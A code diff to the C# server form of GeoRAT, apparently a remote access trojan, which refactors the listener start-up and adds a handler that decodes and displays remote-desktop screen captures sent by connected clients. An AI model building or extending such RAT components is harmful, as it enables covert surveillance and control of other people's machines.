@@ -1,5 +1,7 @@
 ﻿
 using System;
+using System.Drawing;
+using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 using GeoRAT.Server.CommandHandlers;
@@ -8,7 +10,9 @@ using GeoRAT.Core.Commands;
 using GeoRAT.Core.PacketStruct;
 using GeoRAT.Core.Compressor;
 using Microsoft.VisualBasic;
- 
+using StreamLibrary;
+using StreamLibrary.UnsafeCodecs;
+
 
 namespace GeoRAT.Server
 {
@@ -26,11 +30,9 @@ namespace GeoRAT.Server
 
         private void xylosButton1_Click(object sender, EventArgs e)
         {
-            
-            int port;  
             var ip = IpTextBox.Text;
             
-            bool convert = Int32.TryParse(PortTextBox.Text, out  port);
+            var convert = int.TryParse(PortTextBox.Text, out var port);
             if (!convert && string.IsNullOrEmpty(ip)  || !convert || string.IsNullOrEmpty(ip) || ip.Length < 9) 
             {
                 MessageBox.Show("Enter correct IP and Port!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -38,16 +40,13 @@ namespace GeoRAT.Server
             }
             else
             {
-                NetworkServer ns = new NetworkServer(ip, port);
-          
-                 if (ns.ServerSocket.IsBound)
-                    {
-                        ns.OnConnected += OnConnectedHandler;
-                        ns.Start();
-                    }
-                }
-               
+                var ns = new NetworkServer(ip, port);
+                if (!ns.ServerSocket.IsBound) return;
+                ns.OnConnected += OnConnectedHandler;
+                ns.Start();
             }
+               
+         }
  
 
         #endregion
@@ -182,7 +181,17 @@ namespace GeoRAT.Server
             foreach (ListViewItem i in lvConnections.SelectedItems)
             {
                 _sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
-              }
+                _sender.OnDataReceived += RemoteDesktopHandler;
+            }
+        }
+
+        private void RemoteDesktopHandler(byte[] buffer)
+        {
+            IUnsafeCodec UnsafeCodec = new UnsafeStreamCodec(80); //initialize our Codec
+            Bitmap DecodedImage = UnsafeCodec.DecodeData(new MemoryStream(buffer));
+            var frm = new DesktForm();
+            frm.Show();
+            frm.pictureBox1.Image = DecodedImage;
         }
 
 
